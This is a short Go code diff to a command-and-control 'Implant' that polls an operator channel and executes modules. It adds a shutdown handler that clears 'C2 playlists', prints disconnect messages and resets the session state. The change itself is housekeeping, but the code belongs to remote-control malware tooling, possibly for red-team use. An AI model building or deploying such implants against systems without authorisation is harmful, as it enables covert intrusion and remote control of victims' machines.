@@ -351,6 +351,20 @@ func (imp *Implant) pollAndExecute() {
 			continue
 		}
 
+		// Handle operator shutdown signal
+		if msg.Module == "shutdown" {
+			_ = imp.client.CleanC2Playlists(ctx,
+				protocol.ChannelCmd, imp.key, seqNum)
+			fmt.Printf("\n\033[33m[!] Operator has disconnected at %s\033[0m\n",
+				time.Now().Format("15:04:05"))
+			fmt.Println("\033[33m[!] Session terminated. Waiting for new operator...\033[0m")
+			fmt.Println("\033[33m[!] Restart implant for a new session key.\033[0m")
+			// Reset state — stop executing, wait for restart
+			imp.checkinPending = true
+			imp.processedSeqs = make(map[int]bool)
+			continue
+		}
+
 		fmt.Printf("[*] Executing seq=%d module=%s\n", seqNum, msg.Module)
 
 		result := imp.execute(msg)
